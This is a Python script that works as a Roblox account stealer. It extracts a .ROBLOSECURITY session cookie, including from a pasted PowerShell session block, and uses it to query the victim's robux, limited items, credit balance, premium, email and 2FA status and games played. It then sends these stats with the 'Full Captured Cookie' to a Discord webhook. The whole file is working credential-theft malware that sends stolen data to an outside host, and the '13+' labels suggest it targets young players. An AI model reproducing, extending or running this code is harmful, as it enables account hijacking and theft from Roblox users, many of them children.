import sys
import os
import re
import requests
from datetime import datetime, timezone

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""

    raw_str = str(raw_input).strip()
    print(f"DEBUG: Step 1 (Received) -> Length: {len(raw_str)}, Start: {raw_str[:12]}...", file=sys.stderr)

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_match:
        cookie = ps_match.group(1)
        print("DEBUG: Successfully extracted .ROBLOSECURITY from PowerShell session block.", file=sys.stderr)
    else:
        cookie = raw_str

    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()

    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()

    warning_match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
    if warning_match:
        cookie = warning_match.group(1)

    clean_cookie = cookie.rstrip(';').strip()
    print(f"DEBUG: Final processed cookie -> Length: {len(clean_cookie)}, Start: {clean_cookie[:12]}...", file=sys.stderr)
    return clean_cookie

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        raw_arg = sys.argv[1]
        roblosecurity = extract_and_clean_cookie(raw_arg)

        session = requests.Session()
        if roblosecurity:
            session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
        
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/"
        })

        auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
        
        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = 0
        robux = 0
        pending = 0
        rap = 0
        lim_count = 0
        premium = False
        group_count = 0
        owned = 0
        developer = False
        email_ver = False
        twofa = False
        credit = 0.0
        currency = "Unknown"
        adopt_me = False
        mm2 = False
        ps99 = False

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                def get_user_info():
                    return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()

                def get_robux():
                    r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=10).json()
                    return r.get("robux", 0)

                def get_pending():
                    r = session.get(
                        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
                        params={"transactionType": "summary", "timeFrame": "Year"},
                        timeout=10
                    ).json()
                    return r.get("pendingRobuxTotal", 0)

                def get_limiteds():
                    limiteds = []
                    cursor = ""
                    while True:
                        params = {"limit": 100}
                        if cursor:
                            params["cursor"] = cursor
                        r = session.get(
                            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
                            params=params,
                            timeout=10
                        ).json()
                        for item in r.get("data", []):
                            limiteds.append(item.get("recentAveragePrice", 0))
                        cursor = r.get("nextPageCursor")
                        if not cursor:
                            break
                    return limiteds

                def get_premium():
                    r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", timeout=10)
                    return r.json() == True

                def get_groups():
                    r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10).json()
                    groups = r.get("data", [])
                    owned_count = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
                    return len(groups), owned_count

                def get_games_developer():
                    r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}", timeout=10).json()
                    return len(r.get("data", [])) > 0

                def get_account_settings():
                    r = session.get("https://accountsettings.roblox.com/v1/email", timeout=10).json()
                    ev = r.get("verified", False)
                    r2 = session.get("https://twostepverification.roblox.com/v1/metadata", timeout=10).json()
                    tf = r2.get("twoStepVerificationEnabled", False)
                    return ev, tf

                def get_credit():
                    r = session.get("https://billing.roblox.com/v1/credit", timeout=10).json()
                    return r.get("balance", 0), r.get("currencyType", "Unknown")

                def check_played(universe_id):
                    cursor = ""
                    while True:
                        r = session.get(
                            f"https://badges.roblox.com/v1/users/{user_id}/badges",
                            params={"limit": 100, "cursor": cursor},
                            timeout=10
                        ).json()
                        for badge in r.get("data", []):
                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
                                return True
                        cursor = r.get("nextPageCursor")
                        if not cursor:
                            return False

                try:
                    user = get_user_info()
                    created = user.get("created", "")
                    age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days if created else 0
                except Exception:
                    pass

                try:
                    robux = get_robux()
                    pending = get_pending()
                    limiteds = get_limiteds()
                    rap = sum(limiteds)
                    lim_count = len(limiteds)
                    premium = get_premium()
                    group_count, owned = get_groups()
                    developer = get_games_developer()
                    email_ver, twofa = get_account_settings()
                    credit, currency = get_credit()
                    adopt_me = check_played(383310974)
                    mm2 = check_played(142823291)
                    ps99 = check_played(3259657279)
                except Exception:
                    pass

        # Bulletproof flat content payload (bypasses Discord embed array parsing bugs entirely)
        payload = {
            "content": (
                f"👑 **[{display_name} | 13+] Extracted Stats**\n"
                f"🔗 **Profile:** https://www.roblox.com/users/{user_id}/profile | **Rolimons:** https://www.rolimons.com/player/{user_id}\n\n"
                f"👤 **Username:** `{username}`\n"
                f"📈 **Account Stats:** Age: `{age_days} Days` | Dev: `{developer}` | Groups: `{group_count}` (Owned: `{owned}`)\n"
                f"🪙 **Robux:** Balance: `{robux:,} R$` | Pending: `{pending:,} R$`\n"
                f"📦 **Limiteds:** RAP: `{rap:,} R$` | Count: `{lim_count}`\n"
                f"💳 **Payments & Settings:** Credit: `{credit:.2f} {currency}` | Email Verified: `{email_ver}` | 2FA: `{twofa}` | Premium: `{premium}`\n"
                f"🎮 **Games Played:** Adopt Me: `{adopt_me}` | MM2: `{mm2}` | PS99: `{ps99}`\n\n"
                f"🔑 **Full Captured Cookie:**\n```text\n{roblosecurity}\n```"
            )
        }

        max_retries = 3
        success = False
        for attempt in range(1, max_retries + 1):
            try:
                r = requests.post(webhook_url, json=payload, timeout=10)
                print(f"DEBUG: Webhook attempt {attempt} status: {r.status_code}", file=sys.stderr)
                if r.status_code in (200, 204):
                    success = True
                    print("DEBUG: Embed sent successfully!", file=sys.stderr)
                    break
                else:
                    print(f"DEBUG: Webhook attempt {attempt} failed: {r.text}", file=sys.stderr)
            except Exception as ex:
                print(f"DEBUG: Webhook attempt {attempt} error: {ex}", file=sys.stderr)

        if not success:
            print("ERROR: Webhook dispatch failed after 3 maximum attempts.", file=sys.stderr)
            sys.exit(1)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
